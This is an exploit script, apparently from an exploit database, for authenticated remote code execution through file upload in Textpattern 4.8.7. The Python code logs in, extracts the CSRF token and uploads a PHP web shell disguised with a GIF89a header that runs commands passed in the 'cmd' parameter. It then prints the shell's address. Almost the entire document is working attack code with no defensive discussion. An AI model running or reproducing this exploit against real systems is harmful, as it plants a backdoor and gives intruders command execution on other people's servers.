# Exploit Title: [Remote Code Execution on File Upload]
# Date: [10/23/2021]
# Exploit Author: [picaro_o]
# Vendor Homepage: [https://textpattern.com/]
# Version: [4.8.7]
# Tested on: [Linux os]

```#!/usr/bin/env python
import argparse
import requests
import re
import string
import random
import sys

parser = argparse.ArgumentParser()
parser.add_argument("url", help="URL")
parser.add_argument("uname", help="Username")
parser.add_argument("pass", help="Password")
pargs = parser.parse_args()

#login

host = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]


s = requests.Session()
postrq = {'lang':'en','p_userid':username,'p_password':password,'_txp_token':''}
login = s.post(host,data=postrq)

#check login
if "Could not log in" in login.text:
	print("[-]Invalid Credentials")
	sys.exit()

#get token
def gettoken():
	match = re.search('"step":"edit","_txp_token":"([0-9a-zA-z]+)', login.text)
	token = match.group(1)
	return token

#fileupload 
txptoken = gettoken()
shellfilename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
file={
        'fileInputOrder':(None,'1/1'),
        'app_mode':(None,'async'),
        'MAX_FILE_SIZE':(None,'2000000'),
        'event':(None,'file'),
        'step':(None,'file_insert'),
        'id':(None,''),
        '_txp_token':(None,txptoken),
        'thefile[]':(
            shellfilename+".php",
            """
            GIF89a;<?php system($_REQUEST['cmd']); ?>
            """
        ),
}
fileupload = s.post(host,files=file)

#check file upload or not 

if "Files uploaded" in fileupload.text:
	print("[+]Shell uploaded ==> "+host+"/../../files/"+shellfilename+".php")
else:
	print("[-]Failed")```
